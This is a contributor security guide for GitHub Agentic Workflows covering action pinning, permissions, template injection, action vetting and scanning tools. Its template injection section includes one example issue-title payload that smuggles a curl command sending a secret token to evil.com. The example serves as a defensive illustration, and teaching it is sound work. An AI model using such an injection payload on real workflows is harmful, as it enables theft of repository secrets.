# Security Practices for GitHub Agentic Workflows

This document provides comprehensive security guidance for contributors and maintainers of GitHub Agentic Workflows. It explains our security model, best practices, and procedures for maintaining a secure CI/CD pipeline.

## Table of Contents

- [Security Philosophy](#security-philosophy)
- [Action Pinning Policy](#action-pinning-policy)
- [Permission Model](#permission-model)
- [Template Injection Prevention](#template-injection-prevention)
- [Third-Party Action Vetting](#third-party-action-vetting)
- [Security Monitoring](#security-monitoring)
- [Responding to Security Findings](#responding-to-security-findings)
- [Static Analysis Tools](#static-analysis-tools)
- [Security Checklist](#security-checklist)

---

## Security Philosophy

GitHub Agentic Workflows follows a defense-in-depth security model with multiple layers of protection:

1. **Immutable Dependencies**: All actions pinned to SHA commits
2. **Minimal Permissions**: Principle of least privilege throughout
3. **Input Validation**: All external inputs validated and sanitized
4. **Network Isolation**: Restricted network access where applicable
5. **Automated Scanning**: Continuous security monitoring with static analysis
6. **Transparent Updates**: All security-relevant changes are documented

This layered approach ensures that even if one security control fails, others remain in place to protect the system.

---

## Action Pinning Policy

### Why We Pin Actions to SHAs

GitHub Actions can reference dependencies using tags (like `v4`), branches (like `main`), or commit SHAs. We exclusively use commit SHAs because:

**Security Benefits**:
- **Immutability**: SHA commits cannot be changed without changing the hash
- **Supply Chain Protection**: Prevents attackers from replacing tag/branch with malicious code
- **Audit Trail**: Exact version tracking for security audits
- **Reproducibility**: Ensures consistent behavior across runs

**Real-World Attack Scenario**:
```yaml
# ❌ VULNERABLE: Using mutable tag
- uses: actions/checkout@v4

# What can go wrong:
# 1. Tag gets deleted
# 2. Attacker recreates tag pointing to malicious code
# 3. Your workflow now runs attacker's code with full permissions
```

### How to Pin Actions

**Step 1: Find the SHA for a version**

```bash
# Get SHA for a specific tag
git ls-remote https://github.com/actions/checkout v4.1.1

# Output: b4ffde65f46336ab88eb53be808477a3936bae11  refs/tags/v4.1.1
```

**Step 2: Use SHA in workflow with version comment**

```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
```

The comment `# v4.1.1` helps maintainers know which version the SHA represents when checking for updates.

### Maintaining Pinned Actions

**When to Update**:
- **Immediately**: Security vulnerabilities in actions you use
- **Quarterly**: Regular updates for bug fixes and improvements
- **As Needed**: New features or breaking changes you need

**Update Process**:
1. Check GitHub releases for new versions
2. Review changelog for security fixes and breaking changes
3. Get SHA for new version: `git ls-remote https://github.com/owner/action v2.0.0`
4. Update workflow file with new SHA and version comment
5. Test in a feature branch before merging
6. Document reason for update in PR description

**Automation**:
We use Dependabot to automatically create PRs for action updates:

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

Dependabot PRs include:
- New SHA and version
- Changelog information
- Compatibility notes

---

## Permission Model

### Minimal Permissions Principle

GitHub Actions workflows can request various permissions to interact with the repository and GitHub API. We follow the principle of least privilege: **grant only the minimum permissions necessary** for each job.

### Permission Hierarchy

```yaml
# Workflow level: Default for all jobs
permissions:
  contents: read  # Most restrictive default

jobs:
  test:
    # Inherits workflow-level permissions
    runs-on: ubuntu-latest
    steps:
      - run: npm test

  deploy:
    # Override with specific permissions for this job only
    permissions:
      contents: read
      deployments: write
    runs-on: ubuntu-latest
    steps:
      - run: npm run deploy
```

### Available Permissions

| Permission | Read Use Case | Write Use Case |
|------------|---------------|----------------|
| `contents` | Clone repository | Push code, create releases |
| `issues` | Read issues | Create/edit/close issues |
| `pull-requests` | Read PRs | Create/edit/merge PRs |
| `actions` | View workflow runs | Cancel/re-run workflows |
| `checks` | View status checks | Create status checks |
| `deployments` | View deployments | Create deployments |
| `discussions` | Read discussions | Create/edit discussions |
| `packages` | Download packages | Publish packages |
| `security-events` | View security alerts | Dismiss security alerts |

### Permission Best Practices

**✅ DO**:
- Start with `contents: read` as default
- Add specific permissions only to jobs that need them
- Document why elevated permissions are required
- Review permissions during code review

**❌ DON'T**:
- Use `permissions: write-all` (grants everything)
- Give write permissions when read is sufficient
- Assume default permissions are minimal (they're not)

### Safe Outputs Pattern (gh-aw specific)

GitHub Agentic Workflows implements a unique security pattern called "safe outputs":

```yaml
# Main workflow: AI agent runs with minimal permissions
permissions:
  contents: read
  actions: read

safe-outputs:
  create-issue:     # Separate job with only issue creation permission
  add-comment:      # Separate job with only comment permission
```

**How it works**:
1. AI agent analyzes data with read-only access
2. Agent writes desired actions to a secure output file
3. Separate job validates and executes actions with specific write permissions
4. AI never has direct write access to repository

This prevents compromised AI agents from directly modifying your repository.

---

## Template Injection Prevention

Template injection is one of the most critical security risks in GitHub Actions. It occurs when untrusted data flows into GitHub Actions expressions (`${{ }}`), allowing attackers to execute arbitrary code.

### Understanding the Risk

GitHub Actions expressions are evaluated **before** workflow execution. If untrusted input reaches these expressions, attackers can inject code that gets executed with your workflow's permissions.

### Vulnerable Pattern

```yaml
# ❌ VULNERABLE: Direct use of untrusted input
name: Process Issue
on:
  issues:
    types: [opened]

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Echo issue title
        run: echo "Title: ${{ github.event.issue.title }}"
```

**Attack scenario**:
1. Attacker creates issue with title: `"; curl evil.com/?token=$SECRET; echo "`
2. Expression expands to: `echo "Title: "; curl evil.com/?token=$SECRET; echo ""`
3. Attacker's code executes and exfiltrates secrets

### Safe Pattern: Environment Variables

```yaml
# ✅ SECURE: Use environment variables
name: Process Issue
on:
  issues:
    types: [opened]

jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - name: Echo issue title
        env:
          ISSUE_TITLE: ${{ github.event.issue.title }}
        run: echo "Title: $ISSUE_TITLE"
```

**Why it's safe**:
- Expression evaluated in controlled context (environment variable assignment)
- Shell receives the value as **data**, not **code**
- No code injection possible

### Safe vs Unsafe Context Variables

**Always safe in expressions** (GitHub-controlled):
- `github.actor`
- `github.repository`
- `github.run_id`
- `github.run_number`
- `github.sha`

**Never safe without environment variable indirection** (user-controlled):
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.head_ref` (PR authors can control branch names)

### Additional Injection Points

Template injection can occur in multiple places:

**1. Run-name**:
```yaml
# ❌ VULNERABLE
run-name: "Processing ${{ github.event.issue.title }}"

# ✅ SECURE
run-name: "Processing issue #${{ github.event.issue.number }}"
```

**2. Conditional expressions**:
```yaml
# ❌ VULNERABLE
if: github.event.comment.body == 'approved'

# ✅ SECURE
- env:
    COMMENT: ${{ github.event.comment.body }}
  run: |
    if [ "$COMMENT" = "approved" ]; then
      echo "Approved"
    fi
```

**3. Step outputs**:
```yaml
# ⚠️ REVIEW CAREFULLY: Step outputs may contain user data
- name: Use output
  env:
    OUTPUT_VALUE: ${{ steps.previous.outputs.value }}
  run: echo "$OUTPUT_VALUE"
```

---

## Third-Party Action Vetting

### Trust Levels

**1. GitHub-Verified Creators** (✅ Highest Trust):
- `actions/*` - GitHub official actions
- `github/*` - GitHub official actions

**2. Well-Known Verified Publishers** (✅ High Trust):
- Major cloud providers (AWS, Azure, Google Cloud)
- Popular open-source projects with established reputation
- Actions with:
  - Many stars (5000+)
  - Recent updates (within last 6 months)
  - Active maintenance
  - Strong community

**3. Unverified Third-Party** (⚠️ Review Carefully):
- New or unmaintained actions
- Actions with few users
- Actions without source code transparency
- Personal projects

### Vetting Process

Before adding a third-party action:

**1. Review Source Code**:
```bash
# Clone and inspect the action
git clone https://github.com/owner/action
cd action
cat action.yml  # Review what the action does
cat README.md   # Understand usage and permissions
```

**2. Check Permissions Required**:
- What repository permissions does it need?
- Does it access secrets?
- Does it make network calls?
- What data does it process?

**3. Review Maintenance**:
- When was the last commit?
- Are issues being addressed?
- How many contributors?
- Is there a security policy?

**4. Check Community Trust**:
- Stars and forks on GitHub
- Issues and discussions
- Security advisories
- User reviews and mentions

**5. Test in Isolation**:
```yaml
# Test new action in a separate workflow first
name: Test New Action
on: workflow_dispatch
jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read  # Minimal permissions for testing
    steps:
      - uses: new-org/new-action@sha
```

### Red Flags

**Avoid actions that**:
- Request `write-all` permissions without justification
- Are abandoned (no updates in 2+ years)
- Have unresolved critical security issues
- Lack documentation or source code
- Make unexplained network calls
- Process secrets without clear need

---

## Security Monitoring

### Continuous Monitoring

We monitor security through multiple channels:

**1. Dependabot Alerts**:
- Automatically scans dependencies
- Creates PRs for security updates
- Monitored weekly by maintainers

**2. CodeQL Analysis**:
```yaml
# .github/workflows/codeql.yml
name: CodeQL
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 0 * * 1'  # Weekly
```

**3. Static Analysis Tools**:
- **actionlint**: Workflow syntax and shell script validation
- **zizmor**: Security vulnerability scanning
- **poutine**: Supply chain security analysis

**4. Manual Security Reviews**:
- All workflow changes reviewed by maintainers
- Security-focused code review for PR contributions
- Regular security audits of existing workflows

### Security Metrics

We track these security indicators:

| Metric | Target | Current Status |
|--------|--------|----------------|
| Action SHA Pinning | 100% | 99.9% |
| Minimal Permissions | 100% | 100% |
| Template Injection Prevention | 100% | 100% |
| Security Scan Passing | 100% | 100% |
| Dependabot Response Time | < 7 days | < 3 days |

---

## Responding to Security Findings

### Severity Levels

**Critical** (Fix immediately):
- Remote code execution vulnerabilities
- Secret exposure
- Privilege escalation
- Template injection with exploit path

**High** (Fix within 7 days):
- Unpinned actions from untrusted sources
- Overly broad permissions without justification
- Input validation bypass

**Medium** (Fix within 30 days):
- Shell script best practice violations (SC2086)
- Workflow syntax issues
- Outdated action versions without known CVEs

**Low** (Fix when convenient):
- Code quality improvements
- Documentation updates
- Performance optimizations

### Response Workflow

**1. Identification**:
- Automated scanner detects issue
- Security researcher reports vulnerability
- Code review identifies potential risk

**2. Triage**:
- Assess severity and impact
- Determine affected workflows
- Estimate fix complexity
- Assign owner

**3. Fix Development**:
- Create fix in feature branch
- Write tests to prevent regression
- Update documentation
- Run security scans on fix

**4. Review & Testing**:
- Security-focused code review
- Test in CI environment
- Verify fix resolves issue
- Ensure no new issues introduced

**5. Deployment**:
- Merge to main branch
- Monitor workflow runs
- Document in security advisory if needed
- Update security metrics

**6. Follow-up**:
- Root cause analysis
- Improve detection if needed
- Share learnings with team
- Update security documentation

### Reporting Security Issues

If you discover a security vulnerability:

**DO**:
- Email opensource-security@github.com
- Include detailed reproduction steps
- Provide impact assessment
- Wait for response before public disclosure

**DON'T**:
- Open public GitHub issue
- Discuss in public pull requests
- Share exploit code publicly
- Disclose before fix is available

See [SECURITY.md](../SECURITY.md) for complete reporting guidelines.

---

## Static Analysis Tools

### actionlint

**Purpose**: Lint GitHub Actions workflows, validate shell scripts

**Key Checks**:
- Workflow syntax validation
- Shell script issues (via shellcheck)
- Type checking for expressions
- Deprecated feature detection

**Usage**:
```bash
# Run locally
actionlint .github/workflows/*.yml

# For gh-aw workflows
gh aw compile --actionlint
```

**Common Findings**:
- SC2086: Unquoted variable expansion
- SC2016: Expressions don't expand in single quotes
- Missing required properties
- Type mismatches in expressions

### zizmor

**Purpose**: Security vulnerability scanner for GitHub Actions

**Key Checks**:
- Template injection vulnerabilities
- Dangerous trigger configurations
- Permission escalation risks
- Secret exposure patterns

**Usage**:
```bash
# Run locally
zizmor .github/workflows/

# For gh-aw workflows
gh aw compile --zizmor

# Strict mode (fail on findings)
gh aw compile --strict --zizmor
```

**Exit Codes**:
- 0: No findings
- 10: Informational findings
- 11: Low severity
- 12: Medium severity
- 13: High severity
- 14: Critical severity

### poutine

**Purpose**: Supply chain security analyzer

**Key Checks**:
- Unpinned actions
- Untrusted action sources
- Vulnerable dependencies
- Supply chain risk assessment

**Usage**:
```bash
# Run locally
poutine analyze .github/workflows/

# For gh-aw workflows
gh aw compile --poutine
```

**Recommendations**:
- Pin all actions to SHA
- Review third-party actions
- Update outdated dependencies
- Remove unused actions

### Integration in CI/CD

```yaml
name: Security Scan
on:
  pull_request:
    paths:
      - '.github/workflows/**'

jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@sha
      
      - name: Run actionlint
        run: actionlint
      
      - name: Run zizmor
        run: zizmor .github/workflows/
      
      - name: Run poutine
        run: poutine analyze .github/workflows/
```

---

## Security Checklist

Use this checklist when creating or reviewing workflows:

### Template Injection Prevention
- [ ] No untrusted input in `${{ }}` expressions
- [ ] Untrusted data passed via environment variables
- [ ] Safe context variables used where possible
- [ ] Input validation for user-controlled data

### Shell Script Security
- [ ] All variables quoted: `"$VAR"`
- [ ] No SC2086 warnings (unquoted expansion)
- [ ] No SC2016 warnings (wrong quote type)
- [ ] Strict mode enabled: `set -euo pipefail`
- [ ] Input validation implemented

### Supply Chain Security
- [ ] All actions pinned to SHA (not tags/branches)
- [ ] Version comments added to pinned actions (`# v1.2.3`)
- [ ] Actions from verified creators or reviewed
- [ ] Dependencies scanned for vulnerabilities

### Permission Model
- [ ] Minimal permissions specified at workflow level
- [ ] No `write-all` permissions used
- [ ] Job-level permissions used when appropriate
- [ ] Fork PR handling secure (`pull_request` vs `pull_request_target`)

### Static Analysis
- [ ] actionlint passes with no errors
- [ ] zizmor passes (High/Critical addressed)
- [ ] poutine passes (supply chain secure)
- [ ] Scanners integrated in CI/CD

### Additional Controls
- [ ] Secrets stored in GitHub Secrets (not hardcoded)
- [ ] CODEOWNERS includes workflow paths
- [ ] Branch protection enabled
- [ ] Audit logging implemented

---

## Additional Resources

### Internal Documentation
- [GitHub Actions Security Best Practices](../specs/github-actions-security-best-practices.md) - Comprehensive technical guide
- [Template Injection Prevention](../specs/template-injection-prevention.md) - Detailed injection prevention patterns
- [Security Review Methodology](../specs/security_review.md) - How we review security findings
- [Contributing Guidelines](../CONTRIBUTING.md#workflow-security-guidelines) - Security guidelines for contributors
- [Security Policy](../SECURITY.md) - Vulnerability reporting and security policies

### External Resources
- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Using Third-Party Actions Securely](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)
- [Template Injection Research](https://securitylab.github.com/research/github-actions-untrusted-input/)
- [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)

### Security Tools
- [actionlint](https://github.com/rhysd/actionlint) - Workflow linter
- [zizmor](https://github.com/woodruffw/zizmor) - Security scanner
- [poutine](https://github.com/boostsecurityio/poutine) - Supply chain analyzer
- [shellcheck](https://www.shellcheck.net/) - Shell script analyzer

---

**Last Updated**: 2025-12-28  
**Maintained by**: Security Team  
**Questions**: Contact opensource-security@github.com
